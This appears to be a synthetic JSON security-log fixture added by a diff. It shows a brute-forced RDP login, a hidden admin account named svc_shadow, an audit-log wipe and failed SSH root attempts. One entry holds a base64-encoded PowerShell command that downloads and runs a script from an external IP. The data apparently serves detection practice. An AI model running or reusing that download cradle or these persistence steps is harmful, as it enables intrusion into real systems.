@@ -1,0 +1,151 @@
+[
+  {
+    "timestamp": "2026-11-16T08:12:04Z",
+    "host": "DC-LON-01",
+    "event_id": 4624,
+    "user": "s.connor",
+    "source_ip": "10.20.1.45",
+    "status": "Success",
+    "details": "Standard workstation logon via Kerberos"
+  },
+  {
+    "timestamp": "2026-11-16T08:30:11Z",
+    "host": "APP-DUB-02",
+    "event_id": 4624,
+    "user": "l.murphy",
+    "source_ip": "10.20.2.18",
+    "status": "Success",
+    "details": "Standard interactive logon"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:01Z",
+    "host": "DC-LON-01",
+    "event_id": 4625,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Failure",
+    "details": "Bad password - RDP external attempt"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:04Z",
+    "host": "DC-LON-01",
+    "event_id": 4625,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Failure",
+    "details": "Bad password - RDP external attempt"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:07Z",
+    "host": "DC-LON-01",
+    "event_id": 4625,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Failure",
+    "details": "Bad password - RDP external attempt"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:10Z",
+    "host": "DC-LON-01",
+    "event_id": 4625,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Failure",
+    "details": "Bad password - RDP external attempt"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:14Z",
+    "host": "DC-LON-01",
+    "event_id": 4625,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Failure",
+    "details": "Bad password - RDP external attempt"
+  },
+  {
+    "timestamp": "2026-11-16T09:05:19Z",
+    "host": "DC-LON-01",
+    "event_id": 4624,
+    "user": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Success",
+    "details": "Network logon succeeded after multiple failures"
+  },
+  {
+    "timestamp": "2026-11-16T09:07:33Z",
+    "host": "DC-LON-01",
+    "event_id": 4720,
+    "user": "svc_shadow",
+    "actor": "admin_backup",
+    "source_ip": "185.220.101.42",
+    "status": "Success",
+    "details": "A user account was created: svc_shadow"
+  },
+  {
+    "timestamp": "2026-11-16T09:08:02Z",
+    "host": "DC-LON-01",
+    "event_id": 4732,
+    "user": "svc_shadow",
+    "actor": "admin_backup",
+    "group": "Administrators",
+    "source_ip": "185.220.101.42",
+    "status": "Success",
+    "details": "Member svc_shadow added to security-enabled local group Administrators"
+  },
+  {
+    "timestamp": "2026-11-16T09:09:45Z",
+    "host": "DC-LON-01",
+    "event_id": 4688,
+    "user": "svc_shadow",
+    "source_ip": "127.0.0.1",
+    "process": "powershell.exe",
+    "command_line": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAAyAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA=",
+    "status": "Success",
+    "details": "Process creation with encoded PowerShell payload"
+  },
+  {
+    "timestamp": "2026-11-16T09:12:10Z",
+    "host": "DC-LON-01",
+    "event_id": 1102,
+    "user": "svc_shadow",
+    "source_ip": "127.0.0.1",
+    "status": "Success",
+    "details": "The audit log was cleared"
+  },
+  {
+    "timestamp": "2026-11-16T10:15:00Z",
+    "host": "WEB-DUB-01",
+    "event_id": 4625,
+    "user": "root",
+    "source_ip": "91.132.147.88",
+    "status": "Failure",
+    "details": "SSH failed password attempt"
+  },
+  {
+    "timestamp": "2026-11-16T10:15:03Z",
+    "host": "WEB-DUB-01",
+    "event_id": 4625,
+    "user": "root",
+    "source_ip": "91.132.147.88",
+    "status": "Failure",
+    "details": "SSH failed password attempt"
+  },
+  {
+    "timestamp": "2026-11-16T10:15:06Z",
+    "host": "WEB-DUB-01",
+    "event_id": 4625,
+    "user": "root",
+    "source_ip": "91.132.147.88",
+    "status": "Failure",
+    "details": "SSH failed password attempt"
+  },
+  {
+    "timestamp": "2026-11-16T10:15:09Z",
+    "host": "WEB-DUB-01",
+    "event_id": 4625,
+    "user": "root",
+    "source_ip": "91.132.147.88",
+    "status": "Failure",
+    "details": "SSH failed password attempt"
+  }
+]
